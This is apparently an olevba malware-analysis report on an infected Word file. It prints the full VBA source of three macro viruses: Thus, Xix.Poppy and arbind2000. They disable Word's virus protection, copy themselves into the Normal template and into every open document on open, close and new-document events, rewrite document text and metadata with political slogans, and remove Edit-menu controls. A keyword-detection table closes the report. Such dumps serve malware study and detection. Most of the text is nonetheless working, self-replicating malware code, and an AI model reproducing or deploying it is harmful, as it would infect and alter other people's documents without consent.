olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus-based-eedcd66cdce3e4d71df1e4312977ca350a3874e9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus-based-eedcd66cdce3e4d71df1e4312977ca350a3874e9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Thus_001'
'Anti-Smyser'
' This virus is an alteration of a virus which was
' designed to delete all files from one's C: drive on Dec 13th.
' This code is completely benign.
    On Error Resume Next
    Application.Options.VirusProtection = False
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> "'Anti-Smyser'" Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
        .CodeModule.CountOfLines
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
        .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
        .Item(1).CodeModule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    
    For k = 1 To Application.Documents.Count
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> "'Anti-Smyser'" Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
            .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        End If
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
            .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
            .VBComponents.Item(1).CodeModule.CountOfLines)
        End If
    Next k
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub

































































































































































-------------------------------------------------------------------------------
VBA MACRO xix.bas 
in file: Virus.MSWord.Thus-based-eedcd66cdce3e4d71df1e4312977ca350a3874e9 - OLE stream: 'Macros/VBA/xix'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Sub xix()
    
    'VMPCK 1.0d w/Random Path + Update
    '=================================
    'Code Written by VicodinES
    '=================================
    'Poppy ID : 5083-QyUo94005083.c
    '=================================
    'This Virus Is: Xix.Poppy
    
On Error Resume Next
Randomize
BzUz7979 = OnLnBvVq & GjCy17022 & JvCeAiQx & VxLk11768
KrNo8852 = ReRnBxQg & UvHm12817 & LsKgBxIj & TiFo12200
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.VBProject.VBComponents("xix").Export "c:\xix.drv"
ActiveDocument.ReadOnlyRecommended = False
NsRt = Int(Rnd * 100)
    If NsRt = 99 Then MsgBox "Dia 8 de Novembro VOTA NĂO ŕ regionalizaçăo!", vbSystemModal
MgToTvGm = VwDx2292 & LlPg10701
If Day(Now()) = 8 Then Call UmCu9400BsTy
DgCx6829 = DrGhQhNe & ExCf6570 & Int(Rnd * 2675)
With Dialogs(wdDialogFileSummaryInfo)
    .Author = "VOTA NĂO Ŕ REGIONALIZAÇĂO! SIM AO REFORÇO DO MUNICIPALISMO!"
    .Subject = "JOĂO JARDIM x8?! PORRA! DIA 8 VOTA NĂO!"
    .Comments = "A REGIONALIZAÇĂO É UM ERRO COLOSSAL!"
    .Execute
End With
If NormalTemplate.VBProject.VBComponents.Item("xix").Name <> "xix" Then MvBv508370643 = True
PlEqIfRo = QwLq7775 & OpHg16129
If ActiveDocument.VBProject.VBComponents.Item("xix").Name <> "xix" Then TxHi70648 = True
If MvBv508370643 = True And TxHi70648 = False Then Set JxPg706450836 = NormalTemplate.VBProject.VBComponents
If MvBv508370643 = False And TxHi70648 = True Then Set JxPg706450836 = ActiveDocument.VBProject.VBComponents
JxPg706450836.import "c:\xix.drv"
If activeinst = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If TxHi70648 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
'VMPCK v1.0d [The Final Version?]
GoNqGpTs:
End Sub
Sub HelpAbout()
    On Error Resume Next
IqAj10564 = SgGwHmVe & KlLp7022 & PeVyEhIs & NkCo10807
    MsgBox "Joăo Jardim x8?! Porra! Dia 8 Vota NĂO!", vbInformation
End Sub
Sub AutoOpen()
    On Error Resume Next
PuIq14134 = TkEmRxTv & FyIe14577 & Int(Rnd * 8391)
    Call xix
SxLn19336 = OyOrAfGz & QtGv12202 & Int(Rnd * 9871)
End Sub
Sub ToolsMacro()
    On Error Resume Next
    Call xix
End Sub
Sub FileTemplates()
    On Error Resume Next
    Call xix
End Sub
Sub ViewVBCode()
    On Error Resume Next
    Call xix
ChNz19101 = EwCyLsKj & LuTw19501 & Int(Rnd * 9898)
NhAlIqVz = NhNm11382 & TqVm7492
End Sub
Sub UmCu9400BsTy()
    On Error Resume Next
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "sim"
            .Replacement.Text = "năo ŕ regionalizaçăo!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub
-------------------------------------------------------------------------------
VBA MACRO Arbind2000.bas 
in file: Virus.MSWord.Thus-based-eedcd66cdce3e4d71df1e4312977ca350a3874e9 - OLE stream: 'Macros/VBA/Arbind2000'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'arbind2000
'An experiment in Macro programming ;)
'Minimum stealth, no encryption, No payload, No mail replication
'If you had looked you could have found and deleted it but..
'You probably never knew it was here!
  On Error Resume Next
  Application.Options.VirusProtection = False
  Application.Options.SaveNormalPrompt = False
  Application.Options.ConfirmConversions = False
  Dim x As Integer
  Dim found As Boolean
  found = False
  x = 1
  For x = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents.Item(x).CodeModule.Lines(2, 1) = "'arbind2000" Then found = True
  Next x
  If Not found Then
    Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "arbind2000", wdOrganizerObjectProjectItems
  End If
  If NormalTemplate.Saved = False Then NormalTemplate.Save
  
  found = False
  x = 1
  For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents.Item(x).CodeModule.Lines(2, 1) = "'arbind2000" Then found = True
  Next x
  If Not found Then
    NormalTemplate.VBProject.VBComponents("arbind2000").Export ("c:\arbind2000.tmp")
    ActiveDocument.VBProject.VBComponents.import ("c:\arbind2000.tmp")
    ActiveDocument.SaveAs ActiveDocument.FullName
    Kill ("c:\arbind2000.tmp")
  End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

